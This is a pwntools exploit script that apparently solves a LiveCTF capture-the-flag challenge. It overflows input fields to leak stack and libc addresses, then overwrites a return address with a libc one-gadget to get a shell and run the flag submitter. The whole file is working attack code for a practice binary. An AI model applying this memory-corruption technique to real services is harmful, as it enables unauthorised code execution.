from pwn import *
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


p = remote(HOST, int(PORT))

# tick 197 certified
p.recvuntil(b'?')
p.send(b'10\n')

p.recvuntil(b'?')
p.send(b'5\n')

p.recvuntil(b'?')
p.send(b'zzzzzzzzz\xff\n')

p.recvuntil(b'?')
p.send(b'xxxxxxxxx\xff' + b'x' * 0x62 + b'\x6c' + b'a')

#p.interactive()
p.recvuntil(b'\n')
p.recvuntil(b'\n')
data = p.recvuntil("What is your guess #3?", drop=True)

cleaned = bytearray()
i = 0
while i < len(data) - 1:
    if data[i] == 0x1b:
        while data[i] != 0x6d:
            i += 1
        i += 1
        continue
    assert(data[i] == 0x20)
    i += 1
    cleaned.append(data[i])
    i += 1
    assert(data[i] == 0x20)
    i += 1

print(cleaned)
stack = p64(u64(cleaned[172:180]) + 0x20)
print(hex(u64(stack)))
libc = u64(cleaned[140:148]) - 0x29d90

print(hex(libc))

onegadget = libc + 0xebdaf
p.send(b'\x05' * 0x30 + b'y' * 0x32 + b'\x6a' + b'w' * 0xf + stack + p64(onegadget) + b'#' * 0xff + b'\n')

p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
